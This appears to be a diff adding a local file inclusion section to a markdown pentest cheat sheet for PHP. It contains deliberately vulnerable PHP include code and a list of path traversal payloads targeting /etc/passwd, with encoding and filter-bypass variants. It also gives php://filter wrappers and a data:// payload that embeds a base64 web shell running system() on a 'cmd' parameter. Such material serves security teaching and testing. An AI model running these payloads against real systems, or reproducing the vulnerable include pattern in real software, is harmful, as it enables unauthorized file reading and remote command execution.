@@ -1,10 +1,91 @@
 ## Local file inclusion
 
 ### PHP
+##### Vulnerable code:
+###### Standard vulnerable to everything:
+```php
+<?php                                                                                                                                                                                                                                          
+include 'templates/header.php';                                                                                                                                                                                                                
+?>                                                                                                                                                                                                                                             
+<div class="container mt-4">                                                                                                                                                                                                                   
+<?php                                                                                                                                                                                                                                          
+ini_set('display_errors', true);       # UNSAFE        
+ini_set('safe_mode', false);           # UNSAFE (removed from PHP 5.3.0 onwards)
+ini_set('allow_url_fopen', false);                     
+ini_set('allow_url_include', false);
+ini_set('allow_url_include', 'Off');
 
+if(isset($_GET['page'])){
+        include($_GET['page']); # VULNERABLE (any payload injected will work)
+}else{
+        include 'menu.php';
+}
+?>
+</div>
+<?php
+include 'templates/footer.php';
+?>
+```
+###### PHP with filter (/var/www/html):
+```php
+<?php
+include 'templates/header.php';
+?>
+<div class="container mt-4">
+<?php
+ini_set('display_errors', true);
+ini_set('safe_mode', false);
+ini_set('allow_url_fopen', false);
+ini_set('allow_url_include', false);
+ini_set('allow_url_include', 'Off');
 
+function containsStr($str, $subStr){
+    return strpos($str, $subStr) !== false;
+}
 
+if(isset($_GET['page'])){
+    if(!containsStr($_GET['page'], '../..') && containsStr($_GET['page'], '/var/www/html')){
+        include $_GET['page'];
+    }else{
+        echo 'You are not allowed to go outside /var/www/html/ directory!';
+    }
+}else{
+    include 'menu.php';
+}
+?>
+</div>
+<?php
+include 'templates/footer.php';
+	?>
 
+```
+
+#### Achieving LFI:
+##### General payloads
+```
+- Standard:
+/etc/passwd
+../../../../../../../etc/passwd
+
+- URL encodings
+%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
+/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
+
+- "Filter and remove" bypass
+....//....//....//....//....//....//....//....//etc/passwd
+
+- Original path kept
+/var/www/../../etc/passwd
+/var/www/html/../../../etc/passwd
+```
+
+##### PHP wrappers
+PHP wrappers have the same general functionality as normal LFI, but they can bypass some filters.
+```
+php://filter/string.rot13/resource=../../../../../etc/passwd
+php://filter/convert.base64-encode/resource=../../../../../../../etc/passwd
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt         // `cmd` argument inclusion, prints "Shell done!" if it works
+```
 
 
 
